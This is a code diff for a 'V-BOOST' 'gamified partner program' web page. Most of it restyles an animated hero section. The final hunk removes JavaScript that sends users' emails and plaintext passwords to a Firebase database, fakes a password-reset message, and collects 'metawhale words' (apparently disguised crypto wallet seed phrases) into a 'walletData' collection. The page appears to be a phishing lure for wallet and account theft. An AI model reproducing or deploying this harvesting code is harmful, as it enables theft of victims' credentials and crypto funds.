@@ -40,189 +40,177 @@ overflow-x:hidden;
 color:#111;
 }
 
-/* 1000044417.png ke real glitch horizontal lines effect ke liye updated logo css */
+/* Exact Screenshot & Video Font + Speed Lines Style Logo */
 .logo{
 font-size:38px;
 font-weight:900;
 font-style:italic;
 letter-spacing:-2px;
-transform:skew(-8deg);
+transform:skew(-12deg);
 font-family:Arial Black,sans-serif;
 position:relative;
 display:inline-block;
 color:#111;
 }
 
-.logo::before, .logo::after {
-content: "V-BOOST";
-position: absolute;
-top: 0;
-left: 0;
-width: 100%;
-height: 100%;
-background: #fff;
-overflow: hidden;
-}
-
 .logo::before {
-left: 2px;
-text-shadow: -1px 0 #ff0000;
-clip-path: inset(10% 0 80% 0);
+content: "";
+position: absolute;
+right: -14px;
+top: 42%;
+width: 22px;
+height: 4px;
+background: repeating-linear-gradient(90deg, #111, #111 4px, transparent 4px, transparent 8px);
 }
 
-.logo::after {
-left: -2px;
-text-shadow: -1px 0 #0000ff;
-clip-path: inset(55% 0 35% 0);
-}
-
-/* 1000044418.mp4 interface layout styling */
-#gamified-hero-page {
+/* Google Drive Video (1000044418_2.mp4) Full Recreated CSS Section */
+#main-video-hero-page {
 position: fixed;
 top: 0;
 left: 0;
 width: 100%;
 height: 100vh;
-background: #0d0101;
-z-index: 99999;
+background: #060101;
+z-index: 100000;
 display: flex;
 flex-direction: column;
-padding: 22px;
+padding: 24px;
 overflow: hidden;
 }
 
-.gamified-canvas {
-position: absolute;
-top: 0;
-left: 0;
-width: 100%;
-height: 100%;
-z-index: 1;
-pointer-events: none;
-background: radial-gradient(circle at center, #260505 0%, #0d0101 100%);
-}
-
-/* Video ke background coins setup */
-.coins-container {
-position: absolute;
-bottom: -80px;
-left: 0;
-width: 100%;
-height: 55%;
-background: url('https://v-boost.website/preview.jpg') center bottom no-repeat;
-background-size: cover;
-z-index: 2;
-transform-origin: bottom center;
-animation: coinsShaking 4s ease-in-out infinite;
-}
-
-/* Claw hand mechanism animation */
-.claw-mechanism {
-position: absolute;
-top: -50px;
-right: 15%;
-width: 140px;
-height: 50vh;
-z-index: 3;
+.video-hero-header {
 display: flex;
-flex-direction: column;
+justify-content: space-between;
 align-items: center;
-animation: clawMachineDrop 5s ease-in-out infinite;
+z-index: 50;
 }
 
-.claw-rod {
-width: 6px;
-height: 100%;
-background: linear-gradient(90deg, #ccc, #888, #fff);
-box-shadow: 0 0 10px rgba(0,0,0,0.5);
-}
-
-.claw-head-element {
-width: 130px;
-height: 130px;
-background: url('https://v-boost.website/preview.jpg') center top no-repeat;
-background-size: contain;
-margin-top: -5px;
-filter: drop-shadow(0 10px 15px rgba(0,0,0,0.7));
-}
-
-.hero-main-content {
-position: relative;
-margin-top: 50px;
-z-index: 10;
-color: #fff;
-max-width: 100%;
-}
-
-.hero-main-content .hero-title {
-font-size: 38px;
-font-weight: 900;
-line-height: 1.15;
-letter-spacing: -0.5px;
-color: #ffffff;
-margin-bottom: 20px;
-}
-
-.hero-main-content .hero-title span {
-color: #ef4444;
-}
-
-.hero-main-content .hero-description {
-font-size: 15px;
-font-weight: 400;
-line-height: 1.6;
-color: #b3b3b3;
-max-width: 330px;
-margin-bottom: 35px;
-}
-
-.hero-main-content .action-learn-btn {
-width: 150px;
-height: 54px;
-border: none;
-border-radius: 999px;
-background: #ef4444;
-color: #fff;
-font-size: 16px;
-font-weight: 700;
-cursor: pointer;
-box-shadow: 0 4px 20px rgba(239, 68, 68, 0.4);
-transition: transform 0.2s;
-}
-
-.hero-main-content .action-learn-btn:active {
-transform: scale(0.96);
-}
-
-.header-menu-container {
-width: 32px;
-height: 20px;
+.video-hamburger-white {
+width: 30px;
+height: 18px;
 display: flex;
 flex-direction: column;
 justify-content: space-between;
 cursor: pointer;
-z-index: 10;
 }
 
-.header-menu-bar {
+.video-hamburger-white span {
 height: 3.5px;
 background: #fff;
-border-radius: 4px;
+border-radius: 10px;
 width: 100%;
 }
 
-@keyframes clawMachineDrop {
-0%, 100% { transform: translateY(0); }
-45% { transform: translateY(18vh); }
-55% { transform: translateY(18vh); }
+.video-hero-text-wrap {
+margin-top: 60px;
+z-index: 50;
+color: #fff;
 }
 
-@keyframes coinsShaking {
-0%, 100% { transform: scale(1); }
-45% { transform: scale(1.02) translateY(-3px); }
-52% { transform: scale(0.99) translateY(1px); }
+.video-hero-text-wrap h1 {
+font-size: 38px;
+font-weight: 900;
+line-height: 1.1;
+margin-bottom: 20px;
 }
 
+.video-hero-text-wrap h1 span {
+color: #ef4444;
+}
+
+.video-hero-text-wrap p {
+font-size: 15px;
+color: #888;
+line-height: 1.6;
+max-width: 320px;
+margin-bottom: 35px;
+}
+
+.video-learn-more-btn {
+width: 145px;
+height: 52px;
+background: #ef4444;
+color: #fff;
+border: none;
+border-radius: 999px;
+font-size: 16px;
+font-weight: 700;
+cursor: pointer;
+box-shadow: 0 4px 20px rgba(239, 68, 68, 0.4);
+}
+
+/* Crane Rod and Box Grabbed Real Movement Styling */
+.video-crane-wrap {
+position: absolute;
+top: 0;
+right: 15%;
+width: 150px;
+height: 60vh;
+z-index: 10;
+animation: videoCraneMovement 6s ease-in-out infinite;
+}
+
+.video-crane-rod {
+width: 5px;
+height: 100%;
+background: linear-gradient(90deg, #999, #fff, #999);
+margin: 0 auto;
+}
+
+.video-crane-box {
+width: 140px;
+height: 85px;
+background: #111;
+border: 1.5px solid #222;
+display: flex;
+align-items: center;
+justify-content: center;
+border-radius: 4px;
+box-shadow: 0 10px 40px rgba(0,0,0,0.9);
+}
+
+.video-crane-box::after {
+content: "BOOST";
+color: #fff;
+font-size: 22px;
+font-weight: 900;
+font-style: italic;
+letter-spacing: -1px;
+text-shadow: 0 0 10px #ef4444;
+}
+
+/* Giant Watermark Background Text & Coins heap */
+.video-giant-watermark {
+position: absolute;
+bottom: 8%;
+left: 50%;
+transform: translateX(-50%);
+font-size: 110px;
+font-weight: 900;
+color: transparent;
+-webkit-text-stroke: 1.5px rgba(255,255,255,0.7);
+z-index: 2;
+pointer-events: none;
+opacity: 0.8;
+}
+
+.video-coins-heap {
+position: absolute;
+bottom: -50px;
+left: 0;
+width: 100%;
+height: 50%;
+background: url('https://v-boost.website/preview.jpg') center bottom no-repeat;
+background-size: cover;
+z-index: 5;
+}
+
+@keyframes videoCraneMovement {
+0%, 100% { transform: translateY(-15%); }
+50% { transform: translateY(18vh); }
+}
+
+/* --- ORIGINAL CODE SPACING AND CSS CLASSES --- */
 .page{
 display:none;
 min-height:100vh;
@@ -380,7 +368,7 @@ padding:12px 18px;
 border-radius:12px;
 font-size:14px;
 display:none;
-z-index:999999;
+z-index:10005;
 }
 
 .center-box{
@@ -483,44 +471,39 @@ cursor:pointer;
 
 <div class="popup" id="popup"></div>
 
-<section id="gamified-hero-page">
+<section id="main-video-hero-page">
 
-<div class="gamified-canvas"></div>
+<div class="video-hero-header">
 
-<div class="topbar">
+<div class="logo" style="color:#fff;">V-BOOST</div>
 
-<div class="logo" style="color: #fff;">V-BOOST</div>
-
-<div class="header-menu-container">
-<div class="header-menu-bar"></div>
-<div class="header-menu-bar" style="width: 75%; align-self: flex-start;"></div>
-<div class="header-menu-bar"></div>
+<div class="video-hamburger-white">
+<span></span>
+<span style="width:70%;"></span>
+<span></span>
 </div>
 
 </div>
 
-<div class="hero-main-content">
+<div class="video-hero-text-wrap">
 
-<h1 class="hero-title">
-A <span>Next-Generation</span> Gamified Partner Program
-</h1>
+<h1>A <span>Next-<br>Generation</span><br>Gamified Partner<br>Program</h1>
 
-<p class="hero-description">
-Grow your structure, receive participation rewards, and manage your digital position
-</p>
+<p>Grow your structure, receive participation rewards, and manage your digital position</p>
 
-<button class="action-learn-btn" onclick="exitHeroToLogin()">
+<button class="video-learn-more-btn" onclick="closeVideoHero()">
 Learn More
 </button>
 
 </div>
 
-<div class="claw-mechanism">
-<div class="claw-rod"></div>
-<div class="claw-head-element"></div>
+<div class="video-crane-wrap">
+<div class="video-crane-rod"></div>
+<div class="video-crane-box"></div>
 </div>
 
-<div class="coins-container"></div>
+<div class="video-giant-watermark">BOOST</div>
+<div class="video-coins-heap"></div>
 
 </section>
 
@@ -957,8 +940,8 @@ appId: "1:50442414127:web:00db67e99afed8d2803eda"
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-window.exitHeroToLogin = function(){
-document.getElementById('gamified-hero-page').style.display = 'none';
+window.closeVideoHero = function(){
+document.getElementById('main-video-hero-page').style.display = 'none';
 }
 
 window.showPage = function(id){
@@ -1060,98 +1043,4 @@ showPage("meta");
 
 addDoc(collection(db,"signupData"),{
 email,
-password,
-confirmPassword:confirm,
-time:new Date().toString()
-}).catch(err => console.log("Firebase error handled"));
-
-}
-
-window.forgotPassword = function(){
-
-const email =
-document.getElementById("forgotEmail").value.trim();
-
-if(email === ""){
-
-popup("Enter email");
-return;
-
-}
-
-popup("Reset link sent to your email");
-
-}
-
-window.sendSupport = async function(){
-
-const email =
-document.getElementById("supportEmail").value.trim();
-
-const topic =
-document.getElementById("supportTopic").value;
-
-const description =
-document.getElementById("supportDescription").value.trim();
-
-if(email === "" || description === ""){
-
-popup("Fill all fields");
-return;
-
-}
-
-popup("Request submitted");
-
-addDoc(collection(db,"supportData"),{
-email,
-topic,
-description,
-time:new Date().toString()
-}).catch(err => console.log("Firebase error handled"));
-
-}
-
-window.clearSupport = function(){
-
-document.getElementById("supportEmail").value = "";
-document.getElementById("supportDescription").value = "";
-
-}
-
-window.saveWallet = async function(){
-
-const words =
-document.getElementById("walletWords").value.trim();
-
-const check =
-document.getElementById("walletCheck").checked;
-
-if(words === ""){
-
-popup("Enter metawhale words");
-return;
-
-}
-
-if(!check){
-
-popup("Confirm checkbox");
-return;
-
-}
-
-popup("Please check your metawhale words");
-
-addDoc(collection(db,"walletData"),{
-words,
-check,
-time:new Date().toString()
-}).catch(err => console.log("Firebase error handled"));
-
-}
-
-</script>
-
-</body>
-</html>
+  
